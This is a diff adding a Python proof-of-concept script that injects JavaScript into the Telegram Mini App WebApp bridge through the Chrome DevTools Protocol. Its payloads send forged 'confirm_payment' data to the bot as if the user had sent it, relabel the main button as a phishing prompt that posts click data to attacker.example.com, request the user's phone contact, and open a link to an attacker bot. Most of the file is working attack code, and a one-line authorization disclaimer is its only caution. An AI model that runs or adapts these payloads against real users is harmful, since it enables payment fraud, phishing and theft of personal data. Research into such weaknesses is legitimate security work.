@@ -1,0 +1,63 @@
+"""
+tg_active_exploitation.py -- Bridge write operations
+Demonstrates actions an attacker can execute through the
+Telegram.WebApp bridge using CDP.
+NOTE: This script is a conceptual PoC. Do not run against
+accounts without authorization.
+"""
+import websocket
+import json
+
+def execute_bridge_action(ws_url, js_code):
+    """Execute a bridge action via CDP."""
+    ws = websocket.create_connection(ws_url)
+    cmd = json.dumps({
+        "id": 1,
+        "method": "Runtime.evaluate",
+        "params": {"expression": js_code, "returnByValue": True}
+    })
+    ws.send(cmd)
+    result = json.loads(ws.recv())
+    ws.close()
+    return result
+
+# 1. sendData: send data to the bot as the user
+# The bot receives these data as if the user had
+# entered them in the Mini App
+SEND_DATA = """
+window.Telegram.WebApp.sendData(
+    JSON.stringify({action: "confirm_payment", amount: 100})
+);
+"""
+
+# 2. UI injection: modify the main button
+# for phishing inside the Mini App
+PHISHING_BUTTON = """
+var mb = window.Telegram.WebApp.MainButton;
+mb.setText("Confirm secure payment");
+mb.show();
+mb.onClick(function() {
+    // Capture the user interaction
+    fetch("https://attacker.example.com/log", {
+        method: "POST",
+        body: JSON.stringify({clicked: true, time: Date.now()})
+    });
+});
+"""
+
+# 3. requestContact: request the user's contact
+# under the bot's pretense
+REQUEST_CONTACT = """
+window.Telegram.WebApp.requestContact(function(sent) {
+    // If the user accepts, their phone number
+    // is sent to the bot
+    console.log("Contact shared:", sent);
+});
+"""
+
+# 4. openTelegramLink: navigate to a Telegram URI
+OPEN_LINK = """
+window.Telegram.WebApp.openTelegramLink(
+    "https://t.me/attacker_bot?start=phishing"
+);
+"""
